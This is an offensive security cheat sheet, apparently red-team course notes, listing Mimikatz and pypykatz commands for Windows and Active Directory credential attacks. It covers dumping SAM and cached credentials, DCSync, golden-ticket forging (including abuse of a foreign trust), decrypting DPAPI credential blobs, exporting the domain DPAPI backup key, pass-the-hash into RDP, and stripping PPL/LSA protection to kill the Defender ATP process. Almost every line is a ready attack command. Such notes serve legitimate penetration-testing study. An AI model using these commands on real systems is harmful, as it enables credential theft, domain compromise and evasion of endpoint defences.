- Elevate into high-integrity context
	- `token::elevate`
	- "!" before command in Cobalt Strike
- Dump SAM file for local hashes
	- `lsadump::sam`
- Extract Domain Cached Credentials
	- `lsadump::cache`
- DCSync
	- `mimikatz lsadump::dcsync /domain:DOMAIN_NAME /user:USERNAME`
- Golden Ticket
	- `kerberos::golden /user:<username to impersonate> /domain:<FQDN of current domain> /sid:<SID of current domain> /krbtgt:<NTLM hash of krbtgt account> /ticket:golden.kirbi`
	- Abusing foreign trust:
		- `kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:<SID of current domain> /sids:<SID of domain admin account /krbtgt:REDACTED /ticket:zps.kirbi`
- Harvesting DPAPI creds
	- Credential blobs are stored in: `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials`
	- Get guidMasterKey (key identifier) and pbData (encrypted blob) from:
		- `dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\5DD604C1E108746934B92E2A20318758`
	- Retrieve MasterKey from Domain Controller:
		- `dpapi::masterkey /in:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3865823697-1816233505-1834004910-1132\\fcf4f725-0947-4180-a924-bc9da9ed8910 /rpc`
	- Decrypt credential blob with MasterKey:
		- `dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\5DD604C1E108746934B92E2A20318758 /masterkey:REDACTED`
- RDP pass-the-hash
	- `sekurlsa::pth /user:"<username>" /domain:"<domain>" /ntlm:<NTHash> /run:"mstsc.exe /restrictedadmin"`
- Get Kerberos keys
	- `sekurlsa::ekeys`
- Get Kerberos tickets
	- `sekurlsa::tickets`
- Pypykatz
	- `pypykatz lsa minidump lsass.dmp -k /tmp/kerb > output.txt`
- DPAPI Backup Key (domain controller)
	- `lsadump::backupkeys /system:localhost /export`
	- Note: PFX is packed with passphrase "mimikatz". To unpack and repack with a new passphrase:
		- `openssl pkcs12 -in DMK.pfx -out temp.pem -nodes`
		- `openssl pkcs12 -export -out DMK.pfx -in temp.pem`
- Remove PPL protections to kill a process
	- `!processprotect /process:MsSense.exe /remove`
	- This will alert ATP
- Disable LSA Protection by loading mimidrv.sys driver (must upload mimidrv.sys)
	- `!+` at Mimikatz prompt
	- `!processprotect /process:lsass.exe /remove` after driver is loaded
- Use Remote Desktop with PasstheHash
	- `sekurlsa::pth /user:admin /domain:corp1 /ntlm:<NTLM hash> /run:"mstsc.exe /restrictedadmin"
	- RestrictedAdmin must be enabled (disabled by default, set in registry)
`